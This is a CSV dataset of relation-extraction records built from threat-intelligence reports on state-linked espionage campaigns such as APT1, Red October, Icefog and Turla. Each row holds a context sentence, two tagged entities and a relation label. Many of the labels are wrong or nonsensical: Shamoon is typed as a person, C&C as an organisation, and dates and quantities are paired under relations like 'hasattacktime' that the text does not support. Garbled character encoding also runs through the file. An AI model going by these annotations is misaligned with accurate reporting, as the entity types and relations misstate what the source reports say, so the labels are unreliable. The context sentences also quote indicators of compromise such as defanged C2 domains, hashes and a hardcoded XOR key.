"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"Mandiant_APT1_Report","hasattacktime","GSD","ORG","February 6, 2013.  7","DATE","Within the GSD , the 3rd Department has a combined focus on signals intelligence , foreign language proficiency , and defense information 6 James C. Mulvenon and Andrew N. D. Yang , editors , The People¡¯s Liberation Army as Organization : Reference Volume v1.0 , ( Santa Monica , CA : RAND Corporation , 2002 ) , 96 , http://www.rand.org/pubs/conf_proceedings/CF182.html , accessed February 6 , 2013 . 7 Bryan Krekel , Patton Adams , and George Bakos , ¡ ° Occupying the Information High Ground : Chinese Capabilities for Computer Network Operations and Cyber Espionage,¡± "
"Mandiant_APT1_Report","hasattacktime","hundreds of terabytes","QUANTITY","the following 2.5 years","DATE","Given the scope of APT1¡¯s operations , including the number of organizations and industries we have seen them target , along with the volume of data they are clearly capable of stealing from any single organization , APT1 has likely stolen hundreds of terabytes from its victims . Although we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data , we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state - owned enterprises . As an example , in 2008 , APT1 compromised the network of a company involved in a wholesale industry . APT1 installed tools to create compressed file archives and to extract emails and attachments . Over the following 2.5 years , APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives , including the CEO and General Counsel . "
"wp-fakem-rat","indicates","Gh0st","PRODUCT","three","CARDINAL","This research paper examined three variants of a RAT¡ªFAKEM¡ªthat attempt to disguise the network traffic they produce to stay under the radar . Now that popular RATs like Gh0st and PoisonIvy have become well - known and can easily be detected , attackers are looking for methods to blend in with legitimate traffic . "
"Securelist_RedOctober_Detail","hascharacteristics","The Hunt For The Red October","WORK_OF_ART","""Red October""","EVENT","A large scale cyber - espionage network was revealed and analyzed during the investigation , which we called "" Red October "" ( after famous novel "" The Hunt For The Red October "" ) . "
"fireeye-malware-supply-chain","hasproduct","Luckme","ORG","Sunshop PE","PRODUCT","Four of the samples from the Luckme campaign were packaged with the Sunshop PE resource . "
"2013-9","indicates","Shamoon","PERSON","hundreds of gigabytes","QUANTITY","The care that was taken by whoever made Wiper to insure it did as much damage as possible in the shortest amount of time is what differentiates it from Shamoon¡¯s wiping feature . Since wiping a disk with hundreds of gigabytes of storage can take an extremely long time , Wiper was designed to target files with certain extensions or in certain folders to do as much irreparable damage as fast as possible . "
"McAfee_Labs_Threat_Advisory_Exploit_Operation_Red_Oct","hasattacklocation","Cyrillic","NORP","Russia","GPE","% Temp%\msc.bat % ProgramFiles%\Windows NT\svchost.exe % ProgramFiles%\Windows NT\wsdktr.ltp ( Encrypted payload ) - > random name The use of ¡ ° chcp 1251¡± in the batch file is to switch the codepage of an infected system to handle Cyrillic characters . This might suggest that either the attack originates from Russia or was also targeted towards government agencies in Russia . "
"Securelist_RedOctober","hasattacklocation","hundreds of Terabytes","QUANTITY","Germany","GPE","With Rocra , the attackers managed to stay in the game for over 5 years and evade detection of most antivirus products while continuing to exfiltrate what must be hundreds of Terabytes by now . How many Command & Control servers are there ? Did Kaspersky Lab conduct any forensic analysis on them ? During our investigation , we uncovered more than 60 domain names used by the attackers to control and retrieve data from the victims . The domain names map to several dozen IPs located mostly in Russia and Germany . "
"C5_APT_C2InTheFifthDomain","hasproduct","Yahoo","ORG","VisitorID","PRODUCT","The transmission of these cookies could facilitate session stealing and , in the case of the Yahoo cookie , enable unauthorisedwebmailaccess . Each VisitorID cookie contained an expiry time between 9/25/2014 5:50:03 AM and 9/25/20146:14:17AM . "
"fireeye-wwc-report","hasmember","Trojan","PRODUCT","one","CARDINAL","FireEye researchers have even seen one nation - state develop and use a sophisticated Trojan , and later ( after its own counter - Trojan defenses were in place ) sell it to cybercriminals on the black market . "
"icefog","hasproduct","C&C","ORG","C2","PRODUCT","The module retrieves host information and host name and uploads this information to the C2 server . All data sent to the C&C server is encrypted with the hardcoded XOR key ¡ ° * & ~^%@0hh8979¡±. "
"rpt-operation-saffron-rose","indicates","IntelRapidStart.exe","PRODUCT","one","CARDINAL","We had one backdoor in our repository with this same timestamp . This sample ( MD5 1823b77b9ee6296a8b997ffb64d32d21 ) was configured to exfiltrate data to ultrasms[.]ir . The VS_VERSION_INFO PE resource mentioned above ( SHA256 5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3 ) is an artifact of the Stealer builder that we recovered . The builder generates an executable named IntelRapidStart.exe . "
"2013-9","hasattacktime","Shamoon","PERSON","2012, Oct. 23","DATE","The care that was taken by whoever made Wiper to insure it did as much damage as possible in the shortest amount of time is what differentiates it from Shamoon¡¯s wiping feature . Since wiping a disk with hundreds of gigabytes of storage can take an extremely long time , Wiper was designed to target files with certain extensions or in certain folders to do as much irreparable damage as fast as possible . Kaspersky claims that Shamoon was merely a copycat virus that was ¡ ° the work of script kiddies inspired by the story.¡±50 They also claim that Shamoon was probably the work of a non - state group and that Wiper was most likely 40 Mathews , C. , ( 2012 Mar. 30 ) . Obama moves forward with Iran sanctions despite oil price spike . Re.trieved from http://blogs.wsj.com/corruption-currents/2012/03/30/obama-moves-forward-with-iran-sanctions-despite-oil-price-spike/ 41 Flintoff , C. , ( 2012 ) . Sanctions may squeeze Iranÿand raise oil prices . NPR . Retrieved from http://www.npr.org/2012/06/30/155993909/sanctions-may-squeeze-iran-and-raise-oil-prices 42 Katzman , K. , ( 2012 Mar. 28 ) . Iran sanctions . Congressional Research Service Report for Congress . Re.trieved from http://fpc.state.gov/documents/organization/187388.pdf 43 Perlroth , N. , ( 2012 , Oct. 23 ) . "
"The_Epic_Turla_Operation","indicates","14:09:55","TIME","Turla Carbon","LOC","We are planning to cover the Turla Carbon system with more details in a future report . Language artifacts The payload recovered from one of the mothership servers ( at newsforum.servehttp[.]com / wordpress / wp - includes / css / img / upload.php , MD5 : 4dc22c1695d1f275c3b6e503a1b171f5 , Compiled : Thu Sep 06 14:09:55 2012 ) contains two modules , a loader / injector and a backdoor . "
"Mandiant_APT1_Report","hasattacklocation","DOTA","ORG","Shanghai","GPE","This means at the very least that the number was initially allocated by China Mobile for use in Shanghai . The speed of DOTA¡¯s response also indicates that he had the phone with him at the time . We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English Dota : a harry ¡ ° Poter¡± fan ? with various targets including South East Asian military The DOTA persona also appears to be a organizations in Malaysia and the Philippines . "
"icefog","indicates","¡°Icefog¡±","PRODUCT","one","CARDINAL","The name ¡ ° Icefog¡± comes from a string used in the command - and - control server name in one of the samples . The command - and - control software is named ¡ ° Dagger Three¡± , in the Chinese language . The ¡ ° Icefog¡± backdoor set ( also known as ¡ ° Fucobha¡± ) is an interactive espionage tool that is directly controlled by the attackers . "
"hidden_lynx","targets","VOHO","ORG","the Oracle Java SE Rhino Script Engine Remote Code Execution Vulnerability","PRODUCT","The scale and targeted nature of the VOHO campaign set it apart from watering - hole attacks observed in the past . The group first adopted this technique in December 2011 when an exploit for the Oracle Java SE Rhino Script Engine Remote Code Execution Vulnerability ( CVE-2011 - 3544 ) was leveraged to distribute their payloads . "
"Syrian_Malware_Team_BlackWorm","hasattacklocation","Fallaga","ORG","Kuwait","GPE","The original BlackWorm builder was co - authored by Naser Al Mutairi from Kuwait , better known by his online moniker ‘ njq8 ' . He is also known to have coded njw0rm , njRAT / LV , and earlier versions of H - worm / Houdini . We found his code being used in a slew of other RATs such as Fallaga and Spygate . "
